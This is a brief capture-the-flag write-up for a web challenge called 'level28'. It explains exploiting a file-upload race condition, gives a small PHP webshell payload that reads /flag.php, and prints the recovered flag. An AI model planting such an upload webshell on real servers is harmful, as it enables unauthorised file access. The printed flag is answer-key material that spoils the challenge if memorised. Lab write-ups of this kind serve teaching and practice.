---
layout: default
title: level28
---

Here we need to upload our webshell and then read the Flag. We've got only one second before the file get deleted, this is `RCE` combined will `TocToe`.
This will be our payload
```php
<?php
    echo htmlspecialchars(file_get_contents('/flag.php'));
?>
```
*Notice we need to use `htmlspecialchars`, without this function, it won't show us the flag!*

And then we get:
```php
<?php $flag = 'WEBSEC{Can_w3_please_h4ve_mutexes_in_PHP_naow?_Wait_there_is_a_pthread_module_for_php?!_Awwww:/}';
```

**Flag:** ***`WEBSEC{Can_w3_please_h4ve_mutexes_in_PHP_naow?_Wait_there_is_a_pthread_module_for_php?!_Awwww:/}`*** 
